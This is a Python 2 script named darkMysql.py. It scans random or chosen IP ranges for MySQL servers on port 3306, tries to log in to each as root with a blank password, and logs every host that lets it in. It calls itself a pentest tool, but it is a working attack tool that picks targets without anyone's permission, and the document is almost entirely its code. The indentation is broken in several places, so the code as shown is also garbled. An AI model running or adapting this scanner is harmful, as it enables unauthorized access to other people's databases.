#!/usr/bin/python
# This was written for educational purpose and pentest only. Use it at your own risk.
# Author will be not responsible for any damage!
# !!! Special greetz for my friend sinner_01 !!!
# Toolname        : darkMysql.py
# Coder           : baltazar a.k.a b4ltazar a.k.a darkc0der < b4ltazar@gmail.com>
# Version         : 0.1
 
import sys
import subprocess
import socket
import random
import optparse
import MySQLdb
from threading import Thread
 
W  = "\033[0m";  
R  = "\033[31m";  
 
socket.setdefaulttimeout(0.5)
PORT = int(3306)
user = "root"
log = open("darkMysql.log", "a")
threads = []
ips = []
 
def logo():
  print "\n|---------------------------------------------------------------|"
  print "| b4ltazar[@]gmail[dot]com                                      |"
  print "|   11/2013     darkMysql.py    v.0.1                           |"
  print "|                                                               |"
  print "|---------------------------------------------------------------|\n"
   
if sys.platform == 'linux' or sys.platform == 'linux2':
  subprocess.call("clear", shell=True)
  logo()
else:
  subprocess.call("cls", shell=True)
  logo()
 
def randomIP():
  ran1 = random.randrange(255)+1
  ran2 = random.randrange(255)+1
  ran3 = random.randrange(255)+1
  ran4 = random.randrange(255)+1
  randIP = "%d.%d.%d.%d" % (ran1, ran2, ran3, ran4)
  ips.append(randIP)
  return randIP
 
def createR(n):
  for x in xrange(int(n)):
    try:
      randomIP()
    except:
      pass
     
def ipRange(start_ip, end_ip):
  start = list(map(int, start_ip.split(".")))
  end = list(map(int, end_ip.split(".")))
  temp = start
   
  ips.append(start_ip)
  while temp != end:
    start[3] += 1
    for i in(3,2,1):
      if temp[i] == 256:
    temp[i] = 0
    temp[i-1] += 1
    ips.append(".".join(map(str, temp)))
  return ips
 
 
def srvscan(ip):
  try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, PORT))
    s.close()
    if PORT == 3306:
      print W+"\n[+] Mysql open port found on", ip
      mysql(ip)
  except:
    pass
   
def mysql(ip):
  print "[+] Checking IP: %s" % ip
  db = MySQLdb.connect(user= user, passwd = "", host = ip, connect_timeout=5)
  print "[+] Connected"
  print R+"\t[!] w00t,w00t! "+W+"Username root with blank password is OK! "
  print R+"\t[!]", db.get_server_info()
  print W+"[+] Connection successful."
  db.close()
  log.write(ip+"\n")
   
   
class MysqlThread(Thread):
  def __init__(self, ips):
    self.ips = ips
    self.count = 0
    self.check = True
    Thread.__init__(self)
     
  def run(self):
    ips = list(self.ips)
    try:
      if self.check == True:
    for ip in ips:
      srvscan(ip)
    except(ValueError):
      pass
    except(KeyboardInterrupt, SystemExit):
      sys.exit(1)
  def stop(self):
    self.check = False
     
if __name__ == "__main__":
  parser = optparse.OptionParser()
  parser.add_option("-n", dest="number", help="Number of random IPs to generate")
  parser.add_option("-s", dest="Start", help="Start of IP range")
  parser.add_option("-e", dest="End", help="End of IP range")
  parser.add_option("-t", dest="numthreads", default="10", help="Number of threads")
  (options, args) = parser.parse_args()
   
  if options.number != None:
    number = options.number
    print "[+] Number of random IPs to generate:", number
    createR(number)
   
  if options.Start != None and options.End != None:
    Start = options.Start
    End = options.End
    print "[+] Scanning IP range %s-%s" % (Start, End)
    ipRange(Start,End)
    print "[+] Number of IPs to scan:", len(ips)
     
  if options.numthreads != None:
    numthreads = options.numthreads
    print "[+] Number of threads:", options.numthreads
     
     
  i = len(ips) / int(numthreads)
  m = len(ips) % int(numthreads)
  z = 0
  if len(threads) <= numthreads:
    for x in range(0, int(numthreads)):
      sliced = ips[x*i:(x+1)*i]
      if (z<m):
    sliced.append(ips[int(numthreads)*i+z])
    z += 1
      thread = MysqlThread(sliced)
      thread.start()
      threads.append(thread)
    for thread in threads:
      thread.join()
